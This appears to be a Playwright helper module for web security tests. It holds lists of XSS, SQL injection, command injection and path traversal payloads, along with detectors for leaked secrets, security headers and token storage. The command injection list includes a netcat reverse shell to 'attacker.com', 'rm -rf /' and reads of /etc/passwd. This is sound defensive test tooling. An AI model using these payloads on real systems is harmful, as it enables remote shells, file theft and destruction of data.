import { Page, expect } from '@playwright/test';

/**
 * Security Test Helpers
 *
 * Reusable utilities for security testing
 */

// Common XSS payloads for testing
export const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "'-alert(1)-'",
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<video><source onerror=alert("XSS")>',
];

// Common SQL injection payloads
export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "admin'--",
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "' UNION SELECT * FROM users--",
  "1; SELECT * FROM users",
  "1' AND '1'='1",
  "' OR ''='",
  "admin' /*",
  "' OR 1=1#",
];

// Command injection payloads
export const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '$(whoami)',
  '`id`',
  '; rm -rf /',
  '&& cat /etc/passwd',
  '| nc -e /bin/sh attacker.com 4444',
  '; ping -c 3 attacker.com',
];

// Path traversal payloads
export const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
  '/etc/passwd%00.jpg',
];

/**
 * Check if page content contains any XSS payloads rendered as HTML
 */
export async function checkForXSSVulnerability(page: Page): Promise<boolean> {
  const content = await page.content();

  // Check for unescaped script execution
  const hasUnescapedScript = content.includes('<script>alert');

  // Check for event handler injection
  const hasEventHandler = /on\w+\s*=\s*["']?alert/i.test(content);

  return hasUnescapedScript || hasEventHandler;
}

/**
 * Check for sensitive data exposure in page content
 */
export async function checkForSensitiveDataExposure(page: Page): Promise<string[]> {
  const content = await page.content();
  const exposures: string[] = [];

  // Check for common sensitive patterns
  const patterns = [
    { name: 'Password in HTML', regex: /password\s*[:=]\s*["'][^"']+["']/i },
    { name: 'API Key', regex: /api[_-]?key\s*[:=]\s*["'][^"']+["']/i },
    { name: 'Secret', regex: /secret\s*[:=]\s*["'][^"']+["']/i },
    { name: 'Private Key', regex: /-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----/i },
    { name: 'AWS Key', regex: /AKIA[0-9A-Z]{16}/i },
    { name: 'Database Connection', regex: /mongodb(\+srv)?:\/\/[^"'\s]+/i },
    { name: 'JWT Token', regex: /eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/i },
  ];

  for (const pattern of patterns) {
    if (pattern.regex.test(content)) {
      exposures.push(pattern.name);
    }
  }

  return exposures;
}

/**
 * Check localStorage for sensitive data
 */
export async function checkLocalStorageForSensitiveData(page: Page): Promise<string[]> {
  const findings: string[] = [];

  const localStorageData = await page.evaluate(() => {
    const data: Record<string, string | null> = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        data[key] = localStorage.getItem(key);
      }
    }
    return data;
  });

  const sensitivePatterns = [
    { name: 'Plain text password', regex: /"password"\s*:\s*"[^"]+"/i },
    { name: 'Credit card number', regex: /\b\d{13,16}\b/ },
    { name: 'SSN', regex: /\b\d{3}-\d{2}-\d{4}\b/ },
  ];

  const storageString = JSON.stringify(localStorageData);

  for (const pattern of sensitivePatterns) {
    if (pattern.regex.test(storageString)) {
      findings.push(pattern.name);
    }
  }

  return findings;
}

/**
 * Monitor console for sensitive data leakage
 */
export function setupConsoleMonitor(page: Page): { getLogs: () => string[]; getSensitiveFindings: () => string[] } {
  const logs: string[] = [];
  const sensitiveFindings: string[] = [];

  page.on('console', (msg) => {
    const text = msg.text();
    logs.push(text);

    // Check for sensitive data in console logs
    if (/password/i.test(text) && !/password.*required|password.*field/i.test(text)) {
      sensitiveFindings.push('Password mentioned in console');
    }
    if (/bearer\s+[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/i.test(text)) {
      sensitiveFindings.push('Bearer token in console');
    }
  });

  return {
    getLogs: () => logs,
    getSensitiveFindings: () => sensitiveFindings,
  };
}

/**
 * Check security headers on a response
 */
export interface SecurityHeadersResult {
  hasXContentTypeOptions: boolean;
  hasXFrameOptions: boolean;
  hasContentSecurityPolicy: boolean;
  hasStrictTransportSecurity: boolean;
  hasXXSSProtection: boolean;
  serverVersionExposed: boolean;
  poweredByExposed: boolean;
}

export function checkSecurityHeaders(headers: Record<string, string>): SecurityHeadersResult {
  return {
    hasXContentTypeOptions: headers['x-content-type-options'] === 'nosniff',
    hasXFrameOptions: ['DENY', 'SAMEORIGIN'].includes((headers['x-frame-options'] || '').toUpperCase()),
    hasContentSecurityPolicy: !!headers['content-security-policy'],
    hasStrictTransportSecurity: !!headers['strict-transport-security'],
    hasXXSSProtection: !!headers['x-xss-protection'],
    serverVersionExposed: /\d+\.\d+/.test(headers['server'] || ''),
    poweredByExposed: !!headers['x-powered-by'],
  };
}

/**
 * Test input field for XSS vulnerability
 */
export async function testInputForXSS(
  page: Page,
  inputLocator: string,
  submitLocator?: string
): Promise<boolean> {
  let isVulnerable = false;

  // Set up dialog handler to detect XSS
  page.on('dialog', async (dialog) => {
    isVulnerable = true;
    await dialog.dismiss();
  });

  const input = page.locator(inputLocator);

  for (const payload of XSS_PAYLOADS.slice(0, 5)) { // Test first 5 payloads
    await input.fill(payload);

    if (submitLocator) {
      await page.locator(submitLocator).click();
    }

    await page.waitForTimeout(500);

    if (isVulnerable) {
      break;
    }

    await input.clear();
  }

  return isVulnerable;
}

/**
 * Check if authentication tokens are properly secured
 */
export async function checkTokenSecurity(page: Page): Promise<{
  tokenInUrl: boolean;
  tokenInLocalStorage: boolean;
  tokenFormat: string | null;
}> {
  const url = page.url();
  const tokenInUrl = /[?&](token|auth|session|jwt)=/i.test(url);

  const storageData = await page.evaluate(() => {
    return localStorage.getItem('auth-storage');
  });

  let tokenInLocalStorage = false;
  let tokenFormat: string | null = null;

  if (storageData) {
    try {
      const parsed = JSON.parse(storageData);
      const token = parsed?.state?.token;

      if (token) {
        tokenInLocalStorage = true;

        // Identify token format
        if (/^eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(token)) {
          tokenFormat = 'JWT';
        } else if (/^[A-Za-z0-9]{32,}$/.test(token)) {
          tokenFormat = 'Opaque Token';
        } else {
          tokenFormat = 'Unknown';
        }
      }
    } catch {
      // Parsing failed
    }
  }

  return {
    tokenInUrl,
    tokenInLocalStorage,
    tokenFormat,
  };
}

/**
 * Generate a security test report
 */
export interface SecurityReport {
  timestamp: string;
  url: string;
  findings: {
    category: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    description: string;
  }[];
}

export function createSecurityReport(url: string): SecurityReport {
  return {
    timestamp: new Date().toISOString(),
    url,
    findings: [],
  };
}

export function addFinding(
  report: SecurityReport,
  category: string,
  severity: 'low' | 'medium' | 'high' | 'critical',
  description: string
): void {
  report.findings.push({ category, severity, description });
}
